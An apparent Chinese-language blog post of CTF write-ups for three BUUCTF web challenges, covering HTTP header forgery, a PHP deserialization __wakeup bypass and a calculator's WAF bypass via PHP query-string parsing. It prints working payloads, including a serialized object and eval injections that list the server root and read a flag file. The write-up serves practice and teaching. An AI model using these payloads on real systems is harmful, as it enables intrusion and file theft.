      <a data-url="http://example.com/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="ckr0oba3i003ai8vubljo4p0m" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-buuctf3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/05/21/buuctf3/" class="article-date">
  <time datetime="2021-05-21T13:20:13.000Z" itemprop="datePublished">2021-05-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/05/21/buuctf3/">buuctf3</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>查看源码：</p>
<p><img src="/buuctf3.assets/image-20210521234401142.png" alt="image-20210521234401142"></p>
<p>访问Secret.php<img src="/buuctf3.assets/image-20210521234640211.png" alt="image-20210521234640211"></p>
<p>这题应该是伪造HTTP协议，burp抓包，伪造Referer：</p>
<p><img src="/buuctf3.assets/image-20210521235247759.png"></p>
<p>他要求我们用Syclover，伪造User-Agent：</p>
<p><img src="/buuctf3.assets/image-20210521235448143.png" alt="image-20210521235448143"></p>
<p>他又要求只能本地访问，伪造X-Forwarded-For：</p>
<p><img src="/buuctf3.assets/image-20210521235637487.png" alt="image-20210521235637487"></p>
<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>打开容器：<img src="/buuctf3.assets/image-20210522105040083.png" alt="image-20210522105040083"></p>
<p>发现这样一句话，猜测应该是备份文件泄露，用dirsearch扫描一下，但是这个网址的服务器可能做得不大好会扫崩，所以我们来手工测试一下。尝试<a href="http://www.zip：![image-20210522105338750](buuctf3.assets/image-20210522105338750.png)">www.zip：![image-20210522105338750](buuctf3.assets/image-20210522105338750.png)</a></p>
<p>查阅有发现就两个文件有用：<img src="/buuctf3.assets/image-20210522105452036.png" alt="image-20210522105452036"></p>
<p><strong>class.php：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>index.php:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;meyer-reset&#x2F;2.0&#x2F;reset.min.css&quot;&gt;</span><br><span class="line">      &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #login&#123;   </span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line">        left:50%;   </span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line">        margin: 0.67em 0;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;world&quot;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;three.js&#x2F;r70&#x2F;three.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;gsap&#x2F;1.16.1&#x2F;TweenMax.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;OrbitControls.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;Cat.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script  src&#x3D;&quot;index.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中关键的代码段：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">$select = $_GET[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>至此，我们可以知道这是一道反序列化题，当username=admin，password=100时输出flag。但是这里有个麻烦，<code>__wakeup()</code>魔术方法会在反序列化前跳出来执行，也就是username被赋值guest，就破坏了输出flag的条件，因此我们要想办法绕过<code>__wakeup()</code>魔术方法：在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行。</p>
<p><strong>我们尝试构造payload：</strong></p>
<p><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>
<p><strong>这里要注意：</strong>由于这里的username和password属于private变量（private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。），因此在序列化的时候会在字段名前面增加所属类名，并且类名和字段名前要加前缀<code>0</code>。</p>
<p><img src="/buuctf3.assets/image-20210522112524139.png" alt="image-20210522112524139"></p>
<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>打开容器，发现这是一个计算机，查看一下源码：<img src="/buuctf3.assets/image-20210522185134958.png" alt="image-20210522185134958"></p>
<p>现在我们知道服务器端存在一个WAF；</p>
<p>我们先访问一下calc.php：<img src="/buuctf3.assets/image-20210522185307483.png" alt="image-20210522185307483"></p>
<p>我们看到他过滤了一些符号，同时利用num传参</p>
<h4 id="这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass"><a href="#这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass" class="headerlink" title="这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass"></a>这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass</h4><p><strong>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo]  =&gt;   “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</strong></p>
<p><strong>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)；其中<code>%20</code>被删除<code>[</code>被下划线替换。</strong></p>
<p><strong>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</strong></p>
<p><code>/news.php?%20news[id%00=a</code></p>
<p><strong>因为此时的变量名是<code>%20new[id</code>，而WAF识别的变量名是<code>new_id</code>，当php解析时会将<code>%20</code>和<code>[</code>删去，将<code>%20news[id%00</code>的值将存储到$_GET[“news_id”]中。</strong></p>
<p><strong>PHP的字符串解析对部分字符的操作：</strong></p>
<table>
<thead>
<tr>
<th>符号</th>
<th>操作</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>下划线替换</td>
</tr>
<tr>
<td>[</td>
<td>下划线替换</td>
</tr>
<tr>
<td>%20（ ）</td>
<td>删除</td>
</tr>
<tr>
<td>+</td>
<td>删除</td>
</tr>
</tbody></table>
<p>我们看到由于存在eval()函数，因此存在eval()代码执行漏洞：</p>
<p>PHP函数：<br>🌸scandir()：以数组形式返回指定目录中的文件和目录<br>🌸var_dump()：输出变量的相关信息。显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>🌸file_get_contents()：把整个文件读入一个字符串中。</p>
<p>总结:我们通过PHP的字符串解析特性绕过防火墙，利用eval()代码执行漏洞获取flag</p>
<p><strong>构造paylaod：</strong></p>
<p>扫描服务器根目录下文件：<code>calc.php? num=var_dump(scandir(chr(47)))</code></p>
<p><img src="/buuctf3.assets/image-20210522193141532.png" alt="image-20210522193141532"></p>
<p>获取flagg文件的内容：<code>calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p><img src="/buuctf3.assets/image-20210522193354743.png" alt="image-20210522193354743"></p>
<h4 id="？疑问："><a href="#？疑问：" class="headerlink" title="？疑问："></a>？疑问：</h4><p>为什么<code>calc.php?+num=var_dump(system(chr(96).chr(108).chr(115).chr(96)))</code>无法获取服务器底下目录</p>
<p>参考资料：</p>
<p><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-703121.html">https://www.icode9.com/content-4-703121.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/05/21/buuctf3/" data-id="ckr0oba32001xi8vueyl6h4kq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA%E2%80%94labs/" rel="tag">DVWA—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ISCC/" rel="tag">ISCC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" rel="tag">MySQL数据库的搭建与启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa%E2%80%94labs/" rel="tag">dvwa—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/DVWA-labs/" style="font-size: 15px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/ISCC/" style="font-size: 10px;">ISCC</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 12.5px;">PHP</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12.5px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12.5px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 17.5px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/07/17/buuctf8/">buuctf8</a>
          </li>
        
          <li>
            <a href="/2021/07/15/buuctf7/">buuctf7</a>
          </li>
        
          <li>
            <a href="/2021/07/14/buuctf6/">buuctf6</a>
          </li>
        
          <li>
            <a href="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/">攻防世界web进阶</a>
          </li>
        
          <li>
            <a href="/2021/07/12/bugku3/">bugku3</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 linbei<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>